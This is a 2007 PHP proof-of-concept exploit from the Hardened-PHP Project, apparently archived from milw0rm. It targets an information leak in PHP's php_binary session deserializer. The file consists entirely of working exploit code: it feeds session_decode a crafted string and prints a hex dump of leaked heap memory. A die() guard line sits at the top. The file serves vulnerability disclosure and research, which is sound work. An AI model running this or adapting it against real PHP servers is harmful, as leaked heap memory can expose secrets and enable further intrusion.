<?php
  ////////////////////////////////////////////////////////////////////////
  //  _  _                _                     _       ___  _  _  ___  //
  // | || | __ _  _ _  __| | ___  _ _   ___  __| | ___ | _ \| || || _ \ //
  // | __ |/ _` || '_|/ _` |/ -_)| ' \ / -_)/ _` ||___||  _/| __ ||  _/ //
  // |_||_|\__,_||_|  \__,_|\___||_||_|\___|\__,_|     |_|  |_||_||_|   //
  //                                                                    //
  //         Proof of concept code from the Hardened-PHP Project        //
  //                   (C) Copyright 2007 Stefan Esser                  //
  //                                                                    //
  ////////////////////////////////////////////////////////////////////////
  //       PHP php_binary Session Deserialization Information Leak      //
  ////////////////////////////////////////////////////////////////////////

  // This is meant as a protection against remote file inclusion.
  die("REMOVE THIS LINE");

  ini_set("session.serialize_handler", "php_binary");
  
  session_start();
  $x = chr(36).str_repeat("A", 36)."N;".chr(127);
  $data = $x;
  
  session_decode($data);    

  $keys = array_keys($_SESSION);
  $heapdump = $keys[1];
  
  echo "Heapdump\n---------\n\n";
  
  $len = strlen($heapdump);
  for ($b=0; $b<$len; $b+=16) {
    printf("%08x: ", $b);
    for ($i=0; $i<16; $i++) {
      if ($b+$i<$len) {
          printf ("%02x ", ord($heapdump[$b+$i]));
      } else {
          printf (".. ");
      }
    }
    for ($i=0; $i<16; $i++) {
      if ($b+$i<$len) {
          $c = ord($heapdump[$b+$i]);
      } else {
          $c = 0;
      }
      if ($c > 127 || $c < 32) {
        $c = ord(".");
      }
      printf ("%c", $c);
    }
    printf("\n");
  }
?>

# milw0rm.com [2007-03-04]
